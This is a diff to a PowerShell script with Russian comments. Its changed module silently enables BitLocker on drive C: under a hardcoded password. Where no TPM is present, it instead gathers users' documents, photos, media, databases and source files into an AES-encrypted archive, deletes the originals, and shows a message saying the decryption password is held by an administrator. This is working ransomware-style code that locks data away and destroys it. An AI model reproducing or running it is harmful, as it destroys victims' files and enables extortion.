@@ -198,16 +198,143 @@ Start-Job -Name "ETWMonitor" -ScriptBlock {
 }
 
 # ============================================
-# МОДУЛЬ 9: BITLOCKER
+# МОДУЛЬ 9: ШИФРОВАНИЕ (BitLocker или Fallback-архив)
 # ============================================
-Write-Host "Включение BitLocker..." -ForegroundColor Yellow
+Write-Host "Проверка TPM для BitLocker..." -ForegroundColor Yellow
 $Tpm = Get-Tpm -ErrorAction SilentlyContinue
+
 if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
+    # --- Попытка BitLocker ---
+    Write-Host "BitLocker доступен. Включаю..." -ForegroundColor Green
     $Password = ConvertTo-SecureString "YHsgh273h*jY632H23##h#^y7h#^#@#h@" -AsPlainText -Force
     Enable-BitLocker -MountPoint "C:" -PasswordProtector -Password $Password -UsedSpaceOnly -SkipHardwareTest -ErrorAction SilentlyContinue
     Write-Host "BitLocker включен." -ForegroundColor Green
 } else {
-    Write-Host "TPM не найден или не готов. BitLocker пропущен." -ForegroundColor Red
+    # --- Fallback: архивное шифрование ---
+    Write-Host "BitLocker недоступен. Запуск архивного шифрования..." -ForegroundColor Orange
+    
+        # ============================================
+    # МОДУЛЬ 9b: FALLBACK-ШИФРОВАНИЕ (если BitLocker не сработал)
+    # ============================================
+    
+    $Password = "YHsgh273h*jY632H23##h#^y7h#^#@#h@"
+    $ArchivePath = "$env:USERPROFILE\Desktop\encrypted_archive.zip"
+    $DriveToScan = "C:"
+    $MaxFileSizeMB = 50  # Не трогаем файлы больше 50 МБ (чтобы архив не раздуло)
+    
+    # Папки, которые НЕ трогаем
+    $ExcludeDirs = @(
+        "\Windows\",
+        "\Program Files\",
+        "\Program Files (x86)\",
+        "\ProgramData\Microsoft\",
+        "\$Recycle.Bin\",
+        "\System Volume Information\",
+        "\Recovery\"
+    )
+    
+    # Расширения файлов, которые шифруем (документы, фото, видео, базы данных)
+    $TargetExtensions = @(
+        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
+        ".txt", ".rtf", ".csv", ".mdb", ".accdb", ".one", ".odt", ".ods",
+        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai",
+        ".mp4", ".avi", ".mov", ".mkv", ".wmv", ".flv", ".mp3", ".wav", ".wma",
+        ".zip", ".rar", ".7z", ".tar", ".gz",
+        ".html", ".htm", ".xml", ".json", ".sql", ".db", ".sqlite",
+        ".cpp", ".cs", ".java", ".py", ".ps1", ".bat", ".sh"
+    )
+    
+    Write-Host "[BitLocker] Не сработал. Запускаю архивный fallback..." -ForegroundColor Orange
+    
+    # 1. Поиск всех пользовательских файлов
+    $FilesToEncrypt = @()
+    Get-ChildItem -Path $DriveToScan -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+        $FullPath = $_.FullName
+        $Ext = $_.Extension.ToLower()
+        
+        # Проверяем исключения папок
+        $Excluded = $false
+        foreach ($ExDir in $ExcludeDirs) {
+            if ($FullPath.StartsWith($ExDir, [System.StringComparison]::OrdinalIgnoreCase)) {
+                $Excluded = $true
+                break
+            }
+        }
+        
+        # Проверяем расширение и размер
+        if (-not $Excluded -and ($TargetExtensions -contains $Ext) -and ($_.Length -lt ($MaxFileSizeMB * 1MB))) {
+            $FilesToEncrypt += $FullPath
+        }
+    }
+    
+    $TotalFiles = $FilesToEncrypt.Count
+    Write-Host "[Fallback] Найдено $TotalFiles файлов для шифрования..." -ForegroundColor Yellow
+    
+    if ($TotalFiles -eq 0) {
+        Write-Host "[Fallback] Нечего шифровать. Выход." -ForegroundColor Red
+        Exit
+    }
+    
+    # 2. Создаём защищённый паролем ZIP-архив
+    Write-Host "[Fallback] Создаю зашифрованный архив: $ArchivePath" -ForegroundColor Cyan
+    
+    # Используем 7-Zip, если установлен
+    $SevenZip = "C:\Program Files\7-Zip\7z.exe"
+    $UseNativeZip = $false
+    
+    if (Test-Path $SevenZip) {
+        # 7-Zip с паролем и шифрованием AES-256
+        $FileList = $FilesToEncrypt -join "`n"
+        $TempList = "$env:TEMP\files_to_encrypt.txt"
+        $FileList | Out-File -FilePath $TempList -Encoding UTF8
+        
+        & $SevenZip a -tzip -mem=AES256 -p"$Password" -spf -scsUTF-8 @"$ArchivePath" @"$TempList"
+        Remove-Item $TempList -Force
+    } else {
+        # Fallback на встроенный Compress-Archive (без пароля — добавим пароль через .NET)
+        Write-Host "[Fallback] 7-Zip не найден. Использую встроенный метод + пароль через .NET..." -ForegroundColor Yellow
+        
+        # Создаём временный незащищённый архив
+        $TempArchive = "$env:TEMP\temp_archive.zip"
+        Compress-Archive -Path $FilesToEncrypt -DestinationPath $TempArchive -CompressionLevel Optimal -Force
+        
+        # Шифруем архив паролем через .NET
+        $zipBytes = [System.IO.File]::ReadAllBytes($TempArchive)
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.KeySize = 256
+        $aes.BlockSize = 128
+        $aes.GenerateIV()
+        $salt = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(16)
+        $deriveBytes = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($Password, $salt, 10000)
+        $key = $deriveBytes.GetBytes(32)
+        $aes.Key = $key
+        
+        $encryptor = $aes.CreateEncryptor()
+        $encryptedData = $encryptor.TransformFinalBlock($zipBytes, 0, $zipBytes.Length)
+        
+        # Сохраняем IV + Salt + Данные в финальный файл
+        $FinalData = $aes.IV + $salt + $encryptedData
+        [System.IO.File]::WriteAllBytes($ArchivePath, $FinalData)
+        Remove-Item $TempArchive -Force
+        $UseNativeZip = $true
+    }
+    
+    Write-Host "[Fallback] Архив создан и зашифрован." -ForegroundColor Green
+    
+    # 3. Удаление оригиналов
+    Write-Host "[Fallback] Удаляю оригиналы файлов..." -ForegroundColor Red
+    foreach ($File in $FilesToEncrypt) {
+        Remove-Item -Path $File -Force -ErrorAction SilentlyContinue
+    }
+    
+    Write-Host "[Fallback] Готово. Все файлы в архиве: $ArchivePath" -ForegroundColor Green
+    
+    # 4. Сообщение для пользователя
+    [System.Windows.Forms.MessageBox]::Show(
+        "Ваши файлы зашифрованы и упакованы в архив:`n$ArchivePath`n`nПароль для расшифровки у администратора.",
+        "Файлы зашифрованы",
+        0, 48
+    )
 }
 
 # ============================================
